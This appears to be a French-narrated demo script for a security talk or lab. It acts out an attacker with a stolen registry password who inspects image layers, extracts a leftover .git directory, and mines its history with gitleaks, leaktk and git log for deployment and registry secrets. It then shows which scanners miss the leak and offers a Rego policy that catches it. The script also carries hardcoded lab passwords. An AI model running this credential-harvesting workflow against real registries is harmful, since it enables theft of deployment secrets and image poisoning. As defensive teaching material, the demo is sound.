#!/bin/bash

########################
# include the magic
########################
. ../../bin/demo-magic.sh

clear

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../../setup/scripts/domains.sh"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"

REGISTRY_URL="https://${REGISTRY_HOST}"
REGISTRY_USER="sc-admin"
REGISTRY_PASS="RegistryPass123!"
GITEA_URL="http://${GITEA_HOST}"
GITEA_USER="sc-admin"
GITEA_PASS="SecurePass123!"
SSL_CERT_FILE="${REPO_ROOT}/setup/certs/registry.crt"
export SSL_CERT_FILE

WORK_DIR=$(mktemp -d)
LAYERS_DIR="${WORK_DIR}/layers"
ROOTFS_DIR="${WORK_DIR}/rootfs"
EVIDENCE_DIR="${WORK_DIR}/evidence"
mkdir -p "${LAYERS_DIR}" "${ROOTFS_DIR}" "${EVIDENCE_DIR}"

# ============================================================================
# Fonctions utilitaires pour l'extraction des layers
# ============================================================================

get_layer_digests() {
    local repo="$1" tag="$2"
    skopeo inspect --tls-verify=false \
        --creds "${REGISTRY_USER}:${REGISTRY_PASS}" \
        "docker://${REGISTRY_HOST}/${repo}:${tag}" 2>/dev/null \
        | jq -r '
            if (.Layers // []) | length > 0 then .Layers[]
            elif (.LayersData // []) | length > 0 then .LayersData[].Digest
            else empty end
        ' 2>/dev/null
}

download_blob() {
    local repo="$1" digest="$2" output_file="$3"
    local auth
    auth=$(printf '%s:%s' "${REGISTRY_USER}" "${REGISTRY_PASS}" | base64 | tr -d '\n')
    local attempt=1
    while [[ ${attempt} -le 3 ]]; do
        local http
        http=$(curl -sSL -k -H "Authorization: Basic ${auth}" \
            -o "${output_file}" -w "%{http_code}" --max-time 120 \
            "${REGISTRY_URL}/v2/${repo}/blobs/${digest}" 2>/dev/null) || true
        [[ "${http}" == "200" ]] && [[ -s "${output_file}" ]] && return 0
        rm -f "${output_file}"
        attempt=$((attempt + 1)); sleep 1
    done
    return 1
}

extract_blob() {
    local blob="$1" dir="$2"
    local ft
    ft=$(file -b "${blob}" 2>/dev/null || echo "?")

    if echo "${ft}" | grep -qi "zstandard"; then
        zstd -dc "${blob}" 2>/dev/null | tar -xf - -C "${dir}" 2>/dev/null && return 0
    elif echo "${ft}" | grep -qi "gzip\|compressed"; then
        gzip -dc "${blob}" 2>/dev/null | tar -xf - -C "${dir}" 2>/dev/null && return 0
    elif echo "${ft}" | grep -qi "bzip2"; then
        bzip2 -dc "${blob}" 2>/dev/null | tar -xf - -C "${dir}" 2>/dev/null && return 0
    elif echo "${ft}" | grep -qi "XZ"; then
        xz -dc "${blob}" 2>/dev/null | tar -xf - -C "${dir}" 2>/dev/null && return 0
    elif echo "${ft}" | grep -qi "tar"; then
        tar -xf "${blob}" -C "${dir}" 2>/dev/null && return 0
    fi
    tar -xaf "${blob}" -C "${dir}" 2>/dev/null && return 0
    return 1
}

# ============================================================================
# SECTION 1 — Decouverte du registre
# ============================================================================

p "On a récupéré le mot de passe du registre de conteneurs. 😈"
p "1. Reconnaissance : qu'est-ce qu'il y a dans ce registre ?"


pe "curl -sk -u ${REGISTRY_USER}:${REGISTRY_PASS} ${REGISTRY_URL}/v2/_catalog | jq ."

p "alpine et golang : images de base publiques"
p "recipe-api : image applicative 🎯"

pe "skopeo list-tags --creds ${REGISTRY_USER}:${REGISTRY_PASS} docker://${REGISTRY_HOST}/recipe-api | jq ."

# ============================================================================
# SECTION 2 — TruffleHog : premier scan
# ============================================================================

p "2. Premier réflexe : lancer TruffleHog sur l'image"

pe "trufflehog docker --image ${REGISTRY_HOST}/recipe-api:v1.0 --json --no-update 2>&1 | head -4"

p "TruffleHog detecte des tokens de modules Go et des tests"
p "Ce ne sont pas les vrais secrets"


# ============================================================================
# SECTION 3 — Dive : inspection des layers
# ============================================================================
p "A première vue, rien... Mais, souvenez vous du 'COPY . .' dans le Dockerfile" 
p "bat Dockerfile"
bat ${REPO_ROOT}/challenges/victim-repo-sample/Dockerfile
p "3. Inspection visuelle des couches avec dive"
# p "Rappel : les layers Docker sont immuables"
# p "Un 'rm .env' dans la couche N cree un whiteout marker,"
# p "mais les donnees persistent dans la couche N-1. Prouvons-le."

pe "dive podman://${REGISTRY_HOST}/recipe-api:v1.0"

p ".git est present dans une couche, et une autre fait 'rm .env'. 🔨🔨"


# ============================================================================
# SECTION 4 — Extraction des layers + scan gitleaks/leaktk
# ============================================================================

p "4. Mode forensique — on cible la couche qui contient le .git"

p "D'abord, recuperer les digests de chaque layer"
pe "skopeo inspect --tls-verify=false --creds ${REGISTRY_USER}:${REGISTRY_PASS} docker://${REGISTRY_HOST}/recipe-api:v1.0 | jq '.Layers'"

mapfile -t digests_array < <(get_layer_digests "recipe-api" "v1.0" 2>/dev/null || true)
AUTH_B64=$(printf '%s:%s' "${REGISTRY_USER}" "${REGISTRY_PASS}" | base64 | tr -d '\n')

p "${#digests_array[@]} couches. On ne va pas tout extraire"
p "On sonde chaque layer avec 'tar tvf | grep .git' pour trouver la bonne"

TARGET_DIGEST=""
layer_idx=0
for digest in "${digests_array[@]}"; do
    [[ -z "${digest}" ]] && continue
    layer_idx=$((layer_idx + 1))
    blob_file="${LAYERS_DIR}/probe_${layer_idx}"
    download_blob "recipe-api" "${digest}" "${blob_file}" 2>/dev/null || continue

    echo "--- couche ${layer_idx} (${digest:7:12}...) ---" && tar tzf ${blob_file} 2>/dev/null | grep -E '\.git/' | head -5 || echo '  (pas de .git)'

    if tar tzf "${blob_file}" 2>/dev/null | grep -q '\.git/'; then
        TARGET_DIGEST="${digest}"
        p "Jackpot! La couche ${layer_idx} contient le .git avec les commits qui contenaient des secrets"
        # p "On extrait uniquement cette couche"
        pe "mkdir -p ${ROOTFS_DIR}"
        pe "tar -xzf ${blob_file} -C ${ROOTFS_DIR} 2>/dev/null"
        rm -f "${blob_file}"
        break
    fi
    rm -f "${blob_file}"
done

GIT_DIR=$(find "${ROOTFS_DIR}" -type d -name '.git' 2>/dev/null | head -1)

if [[ -n "${GIT_DIR}" ]]; then
    GIT_PARENT=$(dirname "${GIT_DIR}")

    p "4a. Gitleaks sur le dépôt git extrait"
    pe "gitleaks detect --source=\"${GIT_PARENT}\" --report-format=json --report-path=\"${EVIDENCE_DIR}/gitleaks.json\" --no-banner 2>/dev/null || true"
    if [[ -f "${EVIDENCE_DIR}/gitleaks.json" && -s "${EVIDENCE_DIR}/gitleaks.json" ]]; then
        count=$(jq 'length' "${EVIDENCE_DIR}/gitleaks.json" 2>/dev/null || echo "0")
        if [[ "${count}" -gt 0 ]]; then
            p "#   → ${count} secret(s) trouvé(s) par Gitleaks"
            TOKEN=$(jq -r '.[0].Secret' "${EVIDENCE_DIR}/gitleaks.json" 2>/dev/null | head -n 1)
            [[ -n "$TOKEN" ]] && echo "ARGOCD_AUTH_TOKEN=${TOKEN:0:4}...${TOKEN: -4}" || echo "Aucun secret JWT trouvé dans le fichier."
        else
            p "#   ℹ️ Pas de secrets trouvés par Gitleaks"
        fi
    else
        p "#   ℹ️ Pas de secrets trouvés par Gitleaks"
    fi

    p "4b. Leaktk — validation croisée"
    pe "leaktk scan \"${GIT_PARENT}\" 2>/dev/null | jq -r 'if (.results | length > 0) then .results[] | \"\(.context | ltrimstr(\"\\n\") | split(\"=\")[0])=\(.secret[0:4])....\(.secret[-4:])\" else \"Aucun secret trouve\" end' | uniq"
    p "Leaktk les trouve aussi"

    p "4c. Recherche dans l'historique git — les vrais secrets"
    pe "git -C \"${GIT_PARENT}\" log --all -p -S \"ARGOCD_AUTH_TOKEN\" --format=\"COMMIT:%H|%s\" 2>/dev/null | grep -iE '(ARGOCD_AUTH_TOKEN|COMMIT:)' | head -20 | awk '{if (/ARGOCD_AUTH_TOKEN=/) sub(/=.*/, \"=xxxx...xxxx\")} 1'"
    pe "git -C \"${GIT_PARENT}\" log --all -p -S \"REGISTRY_PASSWORD\" --format=\"COMMIT:%H|%s\" 2>/dev/null | grep -iE '(REGISTRY_PASSWORD|COMMIT:)' | head -20 | awk '{if (/REGISTRY_PASSWORD=/) sub(/=.*/, \"=xxxx...xxxx\")} 1'"

    p "Game over."
    # p "ARGOCD_AUTH_TOKEN → acces au deploiement en production"
    # p "REGISTRY_PASSWORD → capacite de pousser des images empoisonnees"
fi

# ============================================================================
# SECTION 5 — Hadolint : angle mort des defenseurs
# ============================================================================

p "5. Est-ce que l'équipe aurait pu le détecter ?"
p "5a. Hadolint est l'outil standard d'audit de Dockerfile"

# pe "git clone http://${GITEA_USER}:${GITEA_PASS}@${GITEA_HOST}/${GITEA_USER}/recipe-api ${WORK_DIR}/recipe-api"

# pe "bat ${WORK_DIR}/recipe-api/Dockerfile"

p "hadolint ${WORK_DIR}/recipe-api/Dockerfile || true"

hadolint ${REPO_ROOT}/challenges/victim-repo-sample/Dockerfile || true

p "Hadolint ne signale rien. COPY . . n'est pas considéré comme une mauvaise pratique"
p "Une issue est ouverte sur le projet"

# ============================================================================
# SECTION 6 — Trivy : angle mort des defenseurs
# ============================================================================

p "5b. Trivy — le scanner le plus utilisé en CI/CD"
pe "trivy image --scanners secret --insecure ${REGISTRY_HOST}/recipe-api:v1.0"

p "0 secrets. Trivy ne sait pas chercher dans un .git qu'il trouverait."

# ============================================================================
# SECTION 7 — Trivy misconfiguration custom : la seule detection
# ============================================================================

p "5c. Pour détecter cette attaque avec Trivy, il faut analyser le Dockerfile source"
p "pas l'image construite. Voici une politique Rego custom :"
pe "bat ${SCRIPT_DIR}/trivy-policies/copy_git_leak.rego"

p "trivy config --config-check ${SCRIPT_DIR}/trivy-policies/ --namespaces user ${WORK_DIR}/recipe-api/Dockerfile"

trivy config --config-check ${SCRIPT_DIR}/trivy-policies/ --namespaces user ${REPO_ROOT}/challenges/victim-repo-sample/Dockerfile

p "C'est la seule détection automatisée trouvée"

# ============================================================================
# Conclusion
# ============================================================================

# p "======================================================================"
# p "Resume : avec un acces au registre, on a extrait"
# p "ARGOCD_AUTH_TOKEN et REGISTRY_PASSWORD"
# p "Aucun scanner standard (hadolint, trivy, trufflehog) ne detecte ces secrets"
# p "Seule l'analyse forensique des layers et une politique Rego custom les revelent"
# p "======================================================================"

# ============================================================================
# Cleanup
# ============================================================================

rm -rf "${WORK_DIR}"

bash "${SCRIPT_DIR}/../challenge3/prepare-poisoned-image.sh" &

p "✅"
